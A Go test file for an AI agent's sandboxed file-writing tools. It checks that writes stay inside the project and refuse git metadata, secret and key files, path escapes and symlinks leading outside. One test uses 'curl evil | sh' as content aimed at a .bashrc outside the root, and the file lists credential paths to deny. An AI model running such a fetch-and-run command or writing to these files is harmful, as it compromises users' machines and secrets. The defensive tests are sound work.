package toolloop

import (
	"context"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"herdr-dots/internal/platform"
)

// draftRoot is a worktree-like project with a file, a .git file, a link to a
// directory outside and a link to a file outside.
func draftRoot(t *testing.T) (root, outside string) {
	t.Helper()
	root, outside = t.TempDir(), t.TempDir()
	for name, body := range map[string]string{"src/app.go": "package app\n\nfunc A() {}\n\nfunc A2() {}\n", ".git": "gitdir: /elsewhere\n", "dup.txt": "x\nx\n"} {
		p := filepath.Join(root, filepath.FromSlash(name))
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.WriteFile(filepath.Join(outside, ".bashrc"), []byte("original\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	return root, outside
}

func runWrite(t *testing.T, root, name string, args any) (string, error) {
	t.Helper()
	raw, _ := json.Marshal(args)
	for _, tool := range WriteTools(root, DefaultLimits()) {
		if tool.Name == name {
			return tool.Run(context.Background(), raw)
		}
	}
	t.Fatalf("no tool %s", name)
	return "", nil
}

func TestWriteFileCreatesAndReplacesInsideTheRoot(t *testing.T) {
	root, _ := draftRoot(t)
	out, err := runWrite(t, root, "write_file", map[string]any{"path": "src/auth/cookie.go", "content": "package auth\n"})
	if err != nil || out != "wrote src/auth/cookie.go (13 bytes)" {
		t.Fatalf("%q %v", out, err)
	}
	if b, _ := os.ReadFile(filepath.Join(root, "src", "auth", "cookie.go")); string(b) != "package auth\n" {
		t.Fatalf("content %q", b)
	}
	if _, err := runWrite(t, root, "write_file", map[string]any{"path": "empty.txt", "content": ""}); err != nil {
		t.Fatalf("an empty file is allowed: %v", err)
	}
	if _, err := runWrite(t, root, "write_file", map[string]any{"path": "x.txt"}); err == nil {
		t.Fatal("missing content must be an error")
	}
	if _, err := runWrite(t, root, "write_file", map[string]any{"path": "big.txt", "content": strings.Repeat("x", MaxWriteBytes+1)}); err == nil {
		t.Fatal("content over the cap must be refused")
	}
}

func TestWriteToolsRefuseGitSecretsAndEscapes(t *testing.T) {
	root, outside := draftRoot(t)
	for _, p := range []string{".git", ".git/HEAD", ".GIT/config", "vendor/x/.git/config", ".env", "keys/server.pem",
		"../escape.txt", filepath.Join(outside, "abs.txt"), ".", "id_rſa", ".ENV", "Secrets/db.txt"} {
		for _, name := range []string{"write_file", "edit_file"} {
			_, err := runWrite(t, root, name, map[string]any{"path": p, "content": "x", "old": "gitdir", "new": "y"})
			if !errors.Is(err, ErrDenied) && !errors.Is(err, ErrOutsideRoot) {
				t.Errorf("%s %q: %v, want ErrDenied or ErrOutsideRoot", name, p, err)
			}
		}
	}
	// Windows-reserved names (streams, devices, trailing dots) are refused
	// where platform.ReservedPathName says so, as for the read tools.
	for _, p := range []string{"con.txt", "src/app.go:hidden", "notes.txt."} {
		_, err := runWrite(t, root, "write_file", map[string]any{"path": p, "content": "x"})
		if refused := errors.Is(err, ErrDenied); refused != platform.ReservedPathName(p) {
			t.Errorf("write_file %q: %v, want refused=%v", p, err, platform.ReservedPathName(p))
		}
	}
	if b, _ := os.ReadFile(filepath.Join(root, ".git")); string(b) != "gitdir: /elsewhere\n" {
		t.Fatal(".git changed")
	}
	if ents, _ := os.ReadDir(outside); len(ents) != 1 {
		t.Fatalf("something was written outside: %v", ents)
	}
}

// Review Focus 4: a symlink inside the worktree never carries a write out.
func TestWriteToolsNeverWriteThroughSymlinks(t *testing.T) {
	root, outside := draftRoot(t)
	symlinkOrSkip(t, outside, filepath.Join(root, "home"))
	symlinkOrSkip(t, filepath.Join(outside, ".bashrc"), filepath.Join(root, "rc"))
	for _, c := range []struct{ tool, path string }{
		{"write_file", "home/.bashrc"}, {"write_file", "home/new.txt"}, {"write_file", "rc"},
		{"edit_file", "home/.bashrc"}, {"edit_file", "rc"},
	} {
		if _, err := runWrite(t, root, c.tool, map[string]any{"path": c.path, "content": "curl evil | sh\n", "old": "original", "new": "pwned"}); err == nil {
			t.Errorf("%s %s went through a symlink", c.tool, c.path)
		}
	}
	if b, _ := os.ReadFile(filepath.Join(outside, ".bashrc")); string(b) != "original\n" {
		t.Fatalf("the file outside changed: %q", b)
	}
	if _, err := os.Stat(filepath.Join(outside, "new.txt")); !os.IsNotExist(err) {
		t.Fatal("a file was created outside")
	}
}

func TestEditFileNeedsExactlyOneOccurrence(t *testing.T) {
	root, _ := draftRoot(t)
	if _, err := runWrite(t, root, "edit_file", map[string]any{"path": "src/app.go", "old": "func B()", "new": "x"}); err == nil || !strings.Contains(err.Error(), "not found") {
		t.Fatalf("0 occurrences: %v", err)
	}
	if _, err := runWrite(t, root, "edit_file", map[string]any{"path": "dup.txt", "old": "x", "new": "y"}); err == nil || !strings.Contains(err.Error(), "appears 2 times") {
		t.Fatalf("2 occurrences: %v", err)
	}
	if _, err := runWrite(t, root, "edit_file", map[string]any{"path": "src/app.go", "old": "", "new": "y"}); err == nil {
		t.Fatal("an empty old must be refused")
	}
	if _, err := runWrite(t, root, "edit_file", map[string]any{"path": "missing.go", "old": "a", "new": "b"}); err == nil || !strings.Contains(err.Error(), "use write_file") {
		t.Fatalf("missing file: %v", err)
	}
	out, err := runWrite(t, root, "edit_file", map[string]any{"path": "src/app.go", "old": "func A() {}", "new": "func A() { audit() }"})
	if err != nil || out != "edited src/app.go" {
		t.Fatalf("%q %v", out, err)
	}
	if b, _ := os.ReadFile(filepath.Join(root, "src", "app.go")); string(b) != "package app\n\nfunc A() { audit() }\n\nfunc A2() {}\n" {
		t.Fatalf("content %q", b)
	}
}

func TestSelectOffersWriteToolsOnlyToDrafts(t *testing.T) {
	root, _ := draftRoot(t)
	names := func(ts []Tool) string {
		var n []string
		for _, t := range ts {
			n = append(n, t.Name)
		}
		return strings.Join(n, ",")
	}
	if ts, lim, note := Select(root, true, false, DefaultLimits()); names(ts) != "read_file,grep,list_files" || note != SystemNote || lim.MaxCalls != 8 {
		t.Fatalf("review: %s %q %d", names(ts), note, lim.MaxCalls)
	}
	if ts, lim, note := Select(root, false, true, DefaultLimits()); names(ts) != "read_file,grep,list_files,write_file,edit_file" || note != WriteNote || lim.MaxCalls != WriteMaxCalls {
		t.Fatalf("draft: %s %q %d", names(ts), note, lim.MaxCalls)
	}
	if ts, _, note := Select(root, false, false, DefaultLimits()); ts != nil || note != "" {
		t.Errorf("neither: %s %q", names(ts), note)
	}
	// Phase 4: tools wanted but no usable root → no tools and NoToolsNote.
	home := t.TempDir()
	setHome(t, home)
	for _, r := range []string{"", home, filepath.Dir(home)} {
		if ts, lim, note := Select(r, true, true, DefaultLimits()); ts != nil || note != NoToolsNote || lim.MaxCalls != 8 {
			t.Errorf("root %q: %s %q %d", r, names(ts), note, lim.MaxCalls)
		}
	}
	if WriteTools(home, DefaultLimits()) != nil {
		t.Fatal("no write tools for the home directory")
	}
	if strings.Contains(names(RepoTools(root, DefaultLimits())), "write") {
		t.Fatal("RepoTools must stay read-only")
	}
}

// The write tools use the read tools' jail: exact on-disk spellings and the
// home-anchored deny globs.
func TestWriteToolsUseTheReadJail(t *testing.T) {
	root, _ := draftRoot(t)
	if _, err := os.Stat(filepath.Join(root, "SRC", "APP.GO")); err == nil { // case-insensitive file system
		for _, p := range []string{"SRC/APP.GO", "src/APP.go", "SRC/new.go"} {
			if _, err := runWrite(t, root, "write_file", map[string]any{"path": p, "content": "x"}); err == nil {
				t.Errorf("write_file %q wrote through another spelling", p)
			}
		}
		if b, _ := os.ReadFile(filepath.Join(root, "src", "app.go")); !strings.HasPrefix(string(b), "package app") {
			t.Fatalf("src/app.go changed: %q", b)
		}
	} else {
		t.Log("case-sensitive file system: spelling variants are other files")
	}
	home := t.TempDir()
	setHome(t, home)
	mustWrite(t, filepath.Join(home, ".kube", "ok.txt"), "fine")
	kube := filepath.Join(home, ".kube")
	for _, name := range []string{"write_file", "edit_file"} {
		if _, err := runWrite(t, kube, name, map[string]any{"path": "config", "content": "x", "old": "a", "new": "b"}); !errors.Is(err, ErrDenied) {
			t.Errorf("%s ~/.kube/config: %v, want ErrDenied (home-anchored glob)", name, err)
		}
	}
	if _, err := os.Stat(filepath.Join(kube, "config")); !os.IsNotExist(err) {
		t.Fatal("~/.kube/config was created")
	}
	if _, err := runWrite(t, kube, "write_file", map[string]any{"path": "notes.txt", "content": "x"}); err != nil {
		t.Fatalf("an ordinary file below home: %v", err)
	}
}
